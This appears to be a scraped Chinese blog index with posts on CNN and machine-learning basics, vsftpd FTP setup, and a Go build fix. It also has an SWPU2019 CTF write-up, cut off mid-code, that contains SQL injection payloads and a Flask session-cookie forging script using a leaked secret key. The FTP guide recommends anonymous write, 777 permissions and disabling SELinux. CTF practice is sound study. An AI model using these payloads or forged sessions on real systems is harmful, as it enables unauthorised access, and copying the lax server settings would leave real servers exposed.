卷积层的大小选择几个小滤波器卷积层的组合比一个大滤波器卷积层好。假设你一层一层地重叠了3个3*3的卷积层（层与层之间有ReLU激活函数）。在这个排列下，第一个卷积层中的每个神经元都对输入数据体有一个3*3的视野。第二个卷积层上的神经元对第一个卷积层有一个3*3的视野，也就是对输入数据体有5*5的视野。同样，在第三个卷积层上的神经元对第二个卷积层有3*3的视野，也就是对输入数据体有7*7的视野。 假设不采用这3个3*3的卷积层，而是使用一个单独的有7*7的感受野的卷积层，那么所有神经元的感受野也是7*7。多个卷积层与非线性的激活层交替的结构，比单一卷积层的结构更能提取出深层的更好的特征。但是也会有一些缺点，假设所有的数据有C个通道，那么单独的7*7卷积层将会包含C*(7*7*C)=49C^2个参数，而3个3*3的卷积层的组合仅有3*(C*(3*3*C))=27C^2个参数 直观说来，最好选择带有小滤波器的卷积层组合，而不是用一个带有大的滤波器的卷积层。前者可以表达出输入数据中更多个强力特征，使用的参数也更少。唯一的不足是，在进行反向传播时，中间的卷积层可能会导致占用更多的内存。 层的尺寸设置各层常见的尺寸设置如下： 输入层：应该能被2整除很多次。常用数字包括32，64，96或224（比如ImageNet卷积神经网络），384和512。 卷积层：应该使用小尺寸滤波器（比如3*3或最多5*5），使用步长S=1。还有一点非常重要，就是对输入数据进行零填充，这样卷积层就不会改变输入数据在空间维度上的尺寸。比如，当F=3，那就使用P=1来保持输入尺寸。当F=5，P=2，一般对于任意F，当P=(F-1)/2的时候能保持输入尺寸。如果必须使用更大的滤波器尺寸（比如7*7之类），通常只用在第一个面对原始图像的卷积层上。 池化层：负责对输入数据的空间维度进行降采样。最常用的设置是用2*2感受野（即F=2）的最大值池化，步长为S=2。注意这一操作将会把输入数据中75%的激活数据丢弃（因为对宽度和高度都进行了2的下采样）。另一个不那么常用的设置是使用3*3的感受野，步长为2。最大值池化的感受野尺寸很少有超过3的，因为池化操作过度，易造成数据信息丢失，这通常会导致算法性能变差。 至此，对卷积神经网络的学习到此告一段落，很多深层次的地方其实还没搞懂，在以后的实践中再加深学习吧。 参考：卷积神经网络入门详解李宏毅机器学习教学视频","link":"/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"title":"机器学习基本知识","text":"最近由于一些需要在学习机器学习，B站上找了一个系列的视频，感觉还行，对机器学习、深度学习好好学习学习，做一些简单的记录。 机器学习机器学习（Machine Learning, ML）是多领域交叉学科，涉及概率论、统计学、逼近论、凸分析、算法复杂度理论等多门学科。专门研究计算机怎样模拟或实现人类的学习行为，以获取新的知识或者技能，重新组织已有的知识结构使之不断改善自身的性能。机器学习是人工智能的核心，是使计算机具有智能的根本途径，其应用遍及人工智能的各个领域，主要使用归纳、综合而不是演绎。机器学习、机器学习，那么这里的学习到底指什么样的一个过程呢？ 学习：针对经验E和一系列任务T以及一定表现的衡量P，如果随之经验E的积累，针对定义好的任务T可以提高表现P，就说明计算机具有学习能力。 机器学习被这样定义：探究和开发一系列算法来如何使计算机不需要通过外部明显地知识，而可以通过数据进行学习、建模，并且利用建立的模型对新输入的数据进行预测的学科。 当今，机器学习已经广为，现在常见并且火热的应用如下： 语音识别 自动驾驶 语言翻译 计算机视觉 推荐系统 无人机 垃圾邮件识别 一些基本概念机器学习、包括下面提到的深度学习都有自己的一些元素，也算是一些概念，主要是：训练集、测试集、特征值、监督学习、非监督学习、半监督学习、分类、回归。下面对主要概念进行解释： 概念学习：从有关某个布尔函数的输入输出训练样例中推断出该布尔函数，概念定义在实例集合之上；训练集（training set）：又称训练样例，用来训练、产生模型或算法的数据集；测试集（testing set）：又称测试样例，专门用来测试训练好的模型或算法的数据集；特征向量（feature vector）：属性的集合，通常用一个向量来表示，附属于一个实例；标记（label）：实例类别的标记，即结果的类型，包括正例（positive example）和反例（negative example）;分类（classification）：目标标记为类别型数据（category）;回归（regression）：目标标记为连续性数值（continuous numeric value）;有监督学习（supervised learning）：训练集数据有类别标记，即训练集的样例存在最终的结果；无监督学习（unsupervised learning）：训练集数据无类别标记；半监督学习（semi-supervised learning）：训练集数据部分有类别标记、部分没有类别标记。 机器学习步骤 1、把数据集拆分为训练集和测试集 2、用训练集和训练集的特征向量来训练算法 3、用训练出的算法在测试集上进行评估（可能涉及调整参数，用到验证集（parameter set）） 算法评估对一个机器学习算法性能的评估，主要考虑一下五个方面： 1、准确率：执行结果的准确度 2、速度：执行速度的快慢 3、强壮性：数据的个别值缺失时能否对数据进行准确处理 4、可规模性：数据集很大的时候算法是否仍然有效 5、可解释性：算法处理数据的结果可解释的程度 深度学习了解了机器学习的基本知识，再往深里说是深度学习（Deep Learning, DL），它是基于机器学习延伸出的一个新领域，由以人脑结构为启发的神经网络算法（NNs）为起源加之模型结构深度的增加发展，并伴随大数据和计算能力的提高而产生的一系列算法。深度学习被广泛应用于图像处理与计算机视觉、自然语言处理以及语音识别等领域。 对于深度学习，主要对神经网络相关的算法进行学习，这也是目前应用最为广泛的机器学习算法了。 神经网络神经网络（NNs），也称人工神经网络（Artificial Neural Networks，简写为ANNs）或称作连接模型（Connection Model），它是一种模仿动物神经网络行为特征，进行分布式并行信息处理的算法数学模型。这种网络依靠系统的复杂程度，通过调整内部大量节点之间相互连接的关系，从而达到处理信息的目的。 它机器学习得以发展出深度学习的关键所在，以人脑中的神经网络为启发产生的机器学习算法。 多层向前神经网络(Muiltilayer Feed-Forward Neural Network)主要有三部分组成：输入层（input layer），隐藏层（hidden layers），输出层（output layer） 每层由单元（unit，也称为神经元）组成，输入层将训练集的实例特征向量进行传入，经过连接结点的权重（weight）传入下一层，上一层的输出是下一层的输入。隐藏层的数量是任意的，输入层和输出层只有一层，不过一般算层数时不将输入层计算在内。 其工作过程大致是：将输入的实例值进行加权求和，再经过非线性方程转化输出到下一层。理论上讲，当隐藏层足够多、训练集足够大时，可以模拟出任何方程。 设计神经网络结构使用神经网络训练数据之前，必须确定神经网络的层数，以及每层单元的个数。 特征向量在被传入输入层时通常被先标准化（normalize）到0和1之间，目的是加速学习的过程，但是输入的特征值类型可能是离散型的，也可能是连续型的。对于离散型的变量，可以通过编码成每一个输入单元对应一个特征值可能赋的值。例如 特征值A可能取三个值（a0、a1、a2），那么可以使用3个输入单元来表示A。如果A=a0，则表示a0的单元值取1，其余取0；如果A=a1，则表示a1的单元值取1，其余取0。 神经网络既可以解决分类问题，也可以解决回归问题。分类问题即为结果是离散型的问题，比如预测哪个品牌的电脑卖得更好；回归问题即结果是连续型的问题，比如预测某地的房价。分类问题居多，因此主要学习分类问题的解决，对于该类问题，如果是两类，用一个输出单元表示即可，即0和1；多于两类则每一个类别用一个输出单元表示，因此输出层的单元数量通常等于类别的数量。 对于隐藏层数的设置，如果没有明确规则，则可以根据实验测试和误差，以及准确度来实验并作出调整。准确度的测试可以利用测试集来进行测试。不过还有一种常用的测试方法：交叉验证方法。 交叉验证方法（Cross-Validation）将数据集分为n份，第一次将第一份作为测试集其余作为训练集进行训练和测试，第二层选择第二份作为测试集其余作为训练集进行训练和测试，依次类推进行。 Backpropagation算法该算法可以说是其他神经网络算法的基本，通过迭代性的训练集输入来处理训练集中的实例，对比通过神经网络处理后输出层的预测值与训练集真实值之间的差，来反向地以最小化误差调节每个连接之间的权重，以此方式逐渐地进行训练。 算法的要素如下： 输入：数据集D、学习率L、一个多层向前神经网络输出：一个训练好的神经网络起始状态时需要初始化权重、偏向（Bias，每个单元都有一个偏向，相当于上层传到当前结点的一个偏移）：随机初始化值在-1到1之间，或者-0.5到0.5之间。 对于一个训练实例，执行以下步骤： 1、由输入层向前传送，传送时需要对每个单元进行加权，然后加上传入到的目标结点的偏向值，最后对加权值进行非线性的转化，然后传送给下层结点。如下图： 2、根据误差进行反向传送 3、按照上述两步，输出训练集不同的数据进行多次的向前传送和反向传送进行更新，终止条件： 权重的更新低于某个阈值 预测的错误率低于某个阈值 达到预设一定的循环次数 非线性转化方程sigmoid函数（S曲线）用来作为转化方程，sigmoid函数曲线形如下图： 通常有两种：双曲函数和逻辑函数 关于机器学习的知识很多，我主要学习一些神经网络的东西，后面会继续记录。","link":"/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"},{"title":"FTP服务器搭建及典型问题的解决","text":"SSH管理远程Linux服务器少不了文件的传输，虽然lrzsz能够解决本地与远程服务器之间文件传输的问题，使用sz/rz即可，比如： sz filename #发送一个文件到本地sz filename1 filename2 #发送多个文件到本地sz dir/* #发送dir目录下的所有文件，不包含dir下的文件夹 从本地传文件到服务器在终端输入rz即可。参考这里。 但是lrzsz处理小文件可以，处理大文件效果就不太好，因此，可以选择另一种方式，没错，搭建一个FTP服务器。而且FTP服务器能支持多人对文件的共享。 搭建FTP服务器我的服务器是CentOS的，因此下面的配置以CentOS下的配置为例，不过其他Linux系统大同小异，根据个人情况配置即可。 安装vsftpdLinux下轻便的的ftp程序应该就是vsftpd了，这里我们直接yum安装： yum install -y vsftpd 配置vsftpdvsftpd的配置目录为/etc/vsftpd，包含下列的配置文件： vsftpd.conf为主要配置文件 ftpusers配置禁止访问 FTP 服务器的用户列表 user_list配置用户访问控制 这里我们主要对vsftpd.conf进行配置，这里可以先用下面这条命令看初始的配置有哪些： cat /etc/vsftpd/vsftpd.conf | grep -v \"#\" | more 各项配置的规则如下： # 开启匿名登录anonymous_enable=YES# 允许使用本地帐户进行FTP用户登录验证local_enable=YES# 允许写write_enable=YES# 设置本地用户默认文件掩码022local_umask=022# 允许匿名上传anon_upload_enable=YES# 允许匿名创建新目录anon_mkdir_write_enable=YES# 同时开放其它权限anon_other_write_enable=YES# 可以发送消息当访问某个目录时dirmessage_enable=YES# 开启上传下载记录xferlog_enable=YES# 数据链通过20端口建立connect_from_port_20=YES# 允许其它用户上传匿名文件#chown_uploads=YES# 所有用户#chown_username=whoever# 日志保存到#xferlog_file=/var/log/xferlog# 日志标准输出xferlog_std_format=YES# 空闲会话时间#idle_session_timeout=600# 数据连接超时时间#data_connection_timeout=120# 隔离的安全用户#nopriv_user=ftpsecure# 开启异步数据线程#async_abor_enable=YES# 开启ASCII协议上传ascii_upload_enable=YES# 开启ASCII协议下载ascii_download_enable=YES# 开启邮箱验证#deny_email_enable=YES# 拒绝的邮箱列表#banned_email_file=/etc/vsftpd/banned_emails# 是否允许直接获取子目录信息#ls_recurse_enable=YES# 监听IPv4listen=NO# 监听IPv6和监听IPv4listen_ipv6=YES# 虚拟用户启用pam认证pam_service_name=vsftpd# 用户组管理userlist_enable=YES# 访问控制tcp_wrappers=YES# 允使用被动模式pasv_enable=YES# 指定使用被动模式时打开端口的最小值pasv_min_port=10060# 指定使用被动模式时打开端口的最大值。pasv_max_port=10090# 用户宽带限制200kps#local_max_rate=200000# 登录后欢迎内容ftpd_banner=Welcome to My FTP service.# ---------开启虚拟用户组参数--------# 开启虚拟用户guest_enable=YES# 主虚拟用户名vsftpd，等下会建立guest_username=vsftpd# 虚拟用户配置（可以对每一个虚拟用户进行单独的权限配置）user_config_dir=/etc/vsftpd/vconf# 启用限定用户在其主目录下chroot_local_user=YES# 开启用户列表chroot管理chroot_list_enable=YES# chroot管理的用户列表（一行一用户,虚拟用户都要添加进去）# 当设置用户只能在登录目录时，chroot管理的用户为不受限制，否则相反chroot_list_file=/etc/vsftpd/chroot_list# 允许chroot管理用户进行写操作allow_writeable_chroot=YES# ---------虚拟用户高级参数（请选择一组）--------# 虚拟用户和本地用户有相同的权限virtual_use_local_privs=YES# 虚拟用户和匿名用户有相同的权限，默认是NOvirtual_use_local_privs=NO# 虚拟用户具有写权限（上传、下载、删除、重命名）virtual_use_local_privs=YESwrite_enable=YES# 虚拟用户不能浏览目录，只能上传文件，无其他权限virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=YESanon_upload_enable=YES# 虚拟用户只能下载文件，无其他权限virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=NOanon_upload_enable=NO# 虚拟用户只能上传和下载文件，无其他权限virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=NOanon_upload_enable=YES# 虚拟用户只能下载文件和创建文件夹，无其他权限virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=NOanon_mkdir_write_enable=YES# 虚拟用户只能下载、删除和重命名文件，无其他权限virtual_use_local_privs=NOwrite_enable=YESanon_world_readable_only=NOanon_other_write_enable=YES 而我们不一定每项都进行配置，在初始的基础之上，进行如下配置即可： # 上面已经给了全部配置的含义，自己比对即可anonymous_enable=NOpam_service_name=vsftpduserlist_enable=YEStcp_wrappers=YESallow_writeable_chroot=YESlocal_root=/data/ftp/ #给ftp账户指定主目录listen_port=60021 #这里也可以不设置，默认ftp是21端口 配置完之后保存，然后重启vsftpd。 创建FTP用户首先创建一个新账户ftpuser： useradd ftpuser 然后为其设置密码： passwd ftpuser 现在这个账户其实是一个可登录的Linux用户，为了安全，我们要限制用户的权限，不能让其登录linux而只能用于登录FTP服务器： usermod -s /sbin/nologin ftpuser 指定主目录前面配置文件里看到了我们为ftp用户指定了主目录/data/ftp，但是初始情况该目录可能不存在，需要新建文件目录： chmod a-w /data/ftp &amp;&amp; chmod 777 -R /data/ftp/pub 这里同时也为目录设置了权限，可以看到pub目录是777权限，文件的上传、下载也就在此目录之下了。 然后设置为用户主目录： usermod -d /data/ftp ftpuser 防火墙设置前面的listen_port如果更改的话，也要在防火墙来开放其端口： firewall-cmd --zone=public --add-port=60021/tcp --permanent 然后重启防火墙： firewall-cmd --reload 至此，基础的配置也就完毕了，下面进行测试。 测试服务器及问题发现连接FTP服务器可以选用一些FTP客户端软件：FileZilla Client、CuteFTP等很多，我用了FileZilla Client进行测试。 这里由于FTP的连接有两种模式：主动（POST）和被动（PASV）两种模式： POST模式：当客户端C向服务端S连接后，使用的是Port模式,那么客户端C会发送一条命令告诉服务端S(客户端C在本地打开了一个端口N在等着你进行数据连接),当服务端S收到这个Port命令后 就会向客户端打开的那个端口N进行连接，这种数据连接就生成了。 PASV模式：当客户端C向服务端S连接后，使用的是Port模式,那么客户端C会发送一条命令告诉服务端S(客户端C在本地打开了一个端口N在等着你进行数据连接),当服务端S收到这个Port命令后 就会向客户端打开的那个端口N进行连接，这种数据连接就生成了。 按照前面的基础配置在测试时发现主动和被动模式登录都存在问题 主动模式连接的问题首次连接发现可以登录，但是读取目录列表失败，报错情况如下： 根据报错提示： 状态: 已登录状态: 读取目录列表...命令: PWD响应: 257 &quot;/data/ftp&quot;命令: TYPE I响应: 200 Switching to Binary mode.命令: PORT xx,xx,xx,xx,216,94响应: 500 Illegal PORT command.命令: PASV响应: 227 Entering Passive Mode (xx,xx,xx,xx,227,27).命令: LIST错误: 20 秒后无活动，连接超时错误: 读取目录列表失败 根据报错日志，不难理解，当成功登录之后，进行目录读取，其实也就是数据传输的时候，因为是主动模式，服务器会主动向客户端这边进行连接，即向21694端口进行连接，然后就报错了，根本原因应该就是客户端机器的防火墙对该端口并没有开放，因此连接肯定是失败的。然后又采用了被动模式进行连接，即服务器开放22727端口等待客户端连接，然而还是失败了，原因何在呢？ 由于一些客观原因，我没有对自己的客户机的防火墙进行更改，而是换用被动模式，当然，也遇到了一些问题。 被动模式连接的问题采用被动连接的方式，首先需要在vsftpd.conf下进行如下配置： pasv_enable=YES #开启被动模式pasv_min_port=44550 #指定被动模式最小端口pasv_max_port=44551 #指定被动模式最大端口pasv_promiscuous=YES #关闭被动模式的安全检查(这个检查可以确保数据连接源于同一IP地址) 重启vsftpd服务 支持了被动模式，并且指定了端口开放范围，那么我们在防火墙进行端口的配置即可。 重启防火墙，然后再次测试： 可以看到目录成功列举了，问题得到解决。 上传文件失败的问题当能成功登录、成功列举目录了之后，最主要的目的当然是文件的上传和下载了，然后当去测试的时候，又出现了问题： 报错：553 Could not create file. 本来想着很简单，应该是文件夹权限的问题，但是对文件夹改了777，甚至/data都改成777了还是不行，后来查资料，网上说可能是SELinux的问题，这是个什么呢？ SELinux(Security-Enhanced Linux) 是美国国家安全局（NSA）对于强制访问控制的实现，是 Linux历史上最杰出的新安全子系统。NSA是在Linux社区的帮助下开发了一种访问控制体系，在这种访问控制体系的限制下，进程只能访问那些在他的任务中所需要文件。 –百科 SELinux 主要作用就是最大限度地减小系统中服务进程可访问的资源（最小权限原则）。 这里有一篇不错的文章可以参考。 那么我们关闭SELinux试试：setenforce 0，然后测试一下看看： 果然成了，那就是它的问题了，下面就对其进行配置先看一下权限：getsebool -a | grep ftpd # 网上是这样的allow_ftpd_anon_write --&gt; offallow_ftpd_full_access --&gt; offallow_ftpd_use_cifs --&gt; offallow_ftpd_use_nfs --&gt; offftpd_connect_db --&gt; offftpd_use_passive_mode --&gt; offftp_home_dir --&gt; off# 但是我的服务器是这样的ftpd_anon_write --&gt; offftpd_connect_all_unreserved --&gt; offftpd_connect_db --&gt; offftpd_full_access --&gt; offftpd_use_cifs --&gt; offftpd_use_fusefs --&gt; offftpd_use_nfs --&gt; offftpd_use_passive_mode --&gt; off 系统之间的差异，没办法，但是解决方式是一样的，命令行执行下面两条命令： setsebool -P ftp_home_dir 1 #这一条命令我的服务器上没执行成功setsebool -P allow_ftpd_full_access 1 然后再开启SELinux：setenforce 1 再次进行测试： 可以看到，成功上传文件，问题解决。 下载文件失败的问题尝试从服务器上下载文件时，又error了… 可以看到，下载文件时报错：550 Failed to open file.这次问题其实不复杂，很容易想到是文件权限的问题，看一下：可以看到test.cap文件是属于root用户组的，并且权限很小，你一个ftpuser用户去操作它肯定没权限，那简单，改一下不就好了：chmod -R 777 test.cap，再试试： 话说回来，如果没有特殊需要，还是用lrzsz方便…最后，希望这篇文章能够帮助到你。 参考：基于CentOS搭建FTP文件服务CentOS7安装FTP服务器553 Could not create file问题的解决","link":"/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/"},{"title":"golang编译项目的一个巨坑","text":"最近在学一些新东西，涉及到了搭obfs4网桥，由于官方提供的网桥项目是go语言编写的，之前又没学过、也没搭过相关环境，可以说基本是从零搞起，其中遇到的问题…算了，下面这个问题必须记录，网上都没找到解决方案，一定要记录一下。 最初的环境搭建由于golang编写的项目会利用git去寻找依赖库，因此首先就需要配置git环境，由于之前知道了旧版的git可能会导致一些问题，于是就手动安装了新版的git。 配置git环境机器上可能已经存在git，可以通过如下命令查看版本信息： git version 如果版本较低，最好就手动更新一下。 首先移除旧版本的git： yum remove git 然后安装最新版的git，当然最好先装一下依赖库： yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidocyum install gcc perl-ExtUtils-MakeMaker 依赖库装好之后，就可以安装、编译最新版的git了： [root@guest ~]# cd /usr/local/src/[root@guest src]# wget https://www.kernel.org/pub/software/scm/git/git-2.26.0.tar.xz[root@guest src]# tar -vxf git-2.26.0.tar.xz[root@guest src]# cd git-2.26.0[root@guest git-2.26.0]# make prefix=/usr/local/git all[root@guest git-2.26.0]# make prefix=/usr/local/git install[root@guest git-2.26.0]# echo &quot;export PATH=$PATH:/usr/local/git/bin&quot; &gt;&gt; /etc/profile[root@guest git-2.26.0]# source /etc/profile 至此，最新版git配置完毕，可以查看其版本信息： [root@guest git-2.26.0]# git versiongit version 2.26.0 配置golang环境golang的环境是参考网上的博客装的，其实就是利用yum安装： [root@guest ~]# yum -y install golang 最初装完之后也就没有管git的版本了，直接把obfs4的项目放在了go/src下进行编译了。 报错信息利用上面的方法搭建的环境直接去编译项目，结果一直报错： 不管是改项目目录、换方式编译，一直都是找不到依赖库的错误，甚至想到了会不会是作者的项目有问题、还给作者发了封邮件…请项目作者不要打我啊… 结果两天都没搞定…都要心灰意冷了… 偶然之间，我发现卸载golang的时候提示会同时卸载git，嗯？？？！！！这个git还是1.8版本的，嗯？？？！！！ 于是就实验了一下，我重新用yum装golang结果确实提示会同时装git-1.8.1，装上之后又看了一下git版本，1.8.1，woc…问题不会在这吧…实践证实，问题就在这。 解决问题首先把当前的golang直接yum remove掉，最好清的干净一些： rm -rf /usr/local/go git最新版的配置就不说了，上面已经讲到了，说一下最新版golang的安装配置。 到官网下载最新版的压缩包，拖到vps里，当然也可以直接wget，之后进行解压： tar -zxf go1.x.x.linux-amd64.tar.gz -C /usr/local 然后配置环境变量： vi /etc/profile 在profile末尾添加如下内容： #golang env configexport GO111MODULE=onexport GOROOT=/usr/local/go export GOPATH=/home/gopathexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin 这里的GO111MODULE配置是go1.11后出的一种新的包管理go modules方式代替vendor机制，可以不需要GOPATH，项目代码也不一定要放在GOPATH下面。 GO111MODULE=auto 自动 GO111MODULE=on 使用go modules，不会在vendor和gopath找依赖 GO111MODULE=off 使用vendor 或者gotpath 然后到/home下新建gopath文件夹，新建之后即可使配置生效： source /etc/profile 查看golang版本go version已经是最新版。 测试将obfs4的项目放到/home/gopath之下，再次进行编译： 可以看到，已经可以成功编译。 问题解决，散花，不知道这是不是全网第一个解决这个问题的文章，不过还是惬意一下。 参考：git最新版配置golang最新版配置obfs4网桥配置","link":"/2020/04/01/golang%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B7%A8%E5%9D%91/"},{"title":"SWPU2019复现","text":"一直想着复现来着，记事本里也记录了几个月了…🤣 Web1二次注入、无列名查询，对MariaDB过滤information_schema的注入。 题目分析进入题目注册并登陆之后，发现可以发布广告，并且在广告名的地方存在二次注入(提交内容的时候注入不执行，查询的时候才执行)，经过测试发现or被ban了，同时空格也会被替换为空，因此需要利用/**/绕过对空格的过滤。既然or被ban掉了，那么便不能再利用order by注入查列数了，此时只能直接利用union select进行列名的遍历了。在测试的过程中发现了后台数据库是MariaDB同时or被ban掉，因此information_schema不能用，此时想到利用mysql.innodb_table_stats来查表名(这个地方可以参考：https://mariadb.com/kb/en/mysqlinnodb_table_stats/)，但是无法获取列名，因此最终获取flag需要借助`无列名注入`了(参考：https://blog.csdn.net/chasingin/article/details/103476001)。 现在思路就很明确了，首先利用union select测试出列数，然后利用mysql.innodb_table_stats查出表名，最后无列名注入拿到flag。 解题首先查列数： -1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 利用mysql.innodb_table_stats查表名： -1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 将列转换为行，进行无列名注入： -1'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 另外补充一点，如果后台数据库是mysql，但是information_schema被ban掉之后，如果mysql没有开启innodb存储引擎则可利用sys数据库``schema_auto_increment_columns和schema_table_statistics_with_buffer来绕过，但是本题后台数据库是MariaDB，上述方法便不可用，不过给一下我做题的时候测试的payload，遇到类似题目可能用得上： -1'union/**/select/**/1,(select/**/group_concat(table_name)from/**/sys.schema_auto_increment_column/**/where/**/table_schema=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22-1'union/**/select/**/1,(select/**/group_concat(table_name)from/**/sys.schema_table_statistics_with_buffer/**/where/**/table_schema=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 然后再利用join或join...using进行无列名查询即可。绕过information_schema可以参考：https://www.anquanke.com/post/id/193512 easy_python考察JWT伪造攻击，软链接任意文件读取 题目分析进入题目是一个登录框，任意用户名密码登录，发现可以进行文件上传： 直接点按钮反馈没有权限… 看源码发现了404 not found的提示，网上的wp是这么说的： 在flask中，可以使用app.errorhandler()装饰器来注册错误处理函数，参数是HTTP 错误状态码或者特定的异常类，由此我们可以联想到在404错误中会有东西存在。 那么我们构造一个任意的文件到url中去访问，看一下回显： 发现响应头中存在Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg== 解码得到：SECRET_KEY:keyqqqwwweee!@#$%^&amp;* 结合前面的权限要求，猜测是JWT伪造了，但是这个题中的JWT直接去解base64的结果是这样的：{&quot;id&quot;:{&quot; b&quot;:&quot;MTAw&quot;},&quot;is_login&quot;:true,&quot;password&quot;:&quot;123&quot;,&quot;username&quot;:&quot;123&quot;} 期初一直以这种结构去伪造，服务器就老是反馈500 error，后来参考网上一篇wp中讲的解JWT用的是如下的代码： \"\"\" Flask Session Cookie Decoder/Encoder \"\"\"__author__ = 'Wilson Sumanang, Alexandre ZANNI'# standard importsimport sysimport zlibfrom itsdangerous import base64_decodeimport ast# Abstract Base Classes (PEP 3119)if sys.version_info[0] &lt; 3: # &lt; 3.0 raise Exception('Must be using at least Python 3')elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4 from abc import ABCMeta, abstractmethodelse: # &gt; 3.4 from abc import ABC, abstractmethod# Lib for argument parsingimport argparse# external Importsfrom flask.sessions import SecureCookieSessionInterfaceclass MockApp(object): def __init__(self, secret_key): self.secret_key = secret_keyif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4 class FSCM(metaclass=ABCMeta): def encode(secret_key, session_cookie_structure): \"\"\" Encode a Flask session cookie \"\"\" try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return \"[Encoding error] {}\".format(e) raise e def decode(session_cookie_value, secret_key=None): \"\"\" Decode a Flask cookie \"\"\" try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith('.'): compressed = True payload = payload[1:] data = payload.split(\".\")[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return \"[Decoding error] {}\".format(e) raise eelse: # &gt; 3.4 class FSCM(ABC): def encode(secret_key, session_cookie_structure): \"\"\" Encode a Flask session cookie \"\"\" try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return \"[Encoding error] {}\".format(e) raise e def decode(session_cookie_value, secret_key=None): \"\"\" Decode a Flask cookie \"\"\" try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith('.'): compressed = True payload = payload[1:] data = payload.split(\".\")[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return \"[Decoding error] {}\".format(e) raise eif __name__ == \"__main__\": # Args are only relevant for __main__ usage ## Description for help parser = argparse.ArgumentParser( description='Flask Session Cookie Decoder/Encoder', epilog=\"Author : Wilson Sumanang, Alexandre ZANNI\") ## prepare sub commands subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand') ## create the parser for the encode command parser_encode = subparsers.add_parser('encode', help='encode') parser_encode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;', help='Secret key', required=True) parser_encode.add_argument('-t', '--cookie-structure', metavar='&lt;string&gt;', help='Session cookie structure', required=True) ## create the parser for the decode command parser_decode = subparsers.add_parser('decode', help='decode') parser_decode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;', help='Secret key', required=False) parser_decode.add_argument('-c', '--cookie-value', metavar='&lt;string&gt;', help='Session cookie value', required=True) ## get args args = parser.parse_args() ## find the option chosen if(args.subcommand == 'encode'): if(args.secret_key is not None and args.cookie_structure is not None): print(FSCM.encode(args.secret_key, args.cookie_structure)) elif(args.subcommand == 'decode'): if(args.secret_key is not None and args.cookie_value is not None): print(FSCM.decode(args.cookie_value,args.secret_key)) elif(args.cookie_value is not None): print(FSCM.decode(args.cookie_value)) 用法如下： 解密:python flask_session_manager.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEY加密:python flask_session_manager.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式 按照这个代码解JWT结果如下： python3 flask_session_manager.py decode -c \"eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSqQQ.0VoijfPiLI6lwy9zvZ-yk5U5Lv8\" -s \"keyqqqwwweee!@#$%^&amp;*\"{'id': b'100', 'is_login': True, 'password': '123', 'username': '123'}这里就可以看出不一样了，现在还没搞懂原因... python3 flask_session_manager.py encode -s \"keyqqqwwweee!@#$%^&amp;*\" -t \"{'id': b'1', 'is_login': True, 'password': '123', 'username': '123'}\"eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSu2A.SeLyR45y3lQcF1dRjwzQw5Y-3TE这里我们伪造id:b'1'的用户session进行登录 利用伪造的session，成功登录： 查看源码如下： @app.route('/upload',methods=['GET','POST'])def upload(): if session['id'] != b'1': return render_template_string(temp) if request.method=='POST': m = hashlib.md5() name = session['password'] name = name+'qweqweqwe' name = name.encode(encoding='utf-8') m.update(name) md5_one= m.hexdigest() n = hashlib.md5() ip = request.remote_addr ip = ip.encode(encoding='utf-8') n.update(ip) md5_ip = 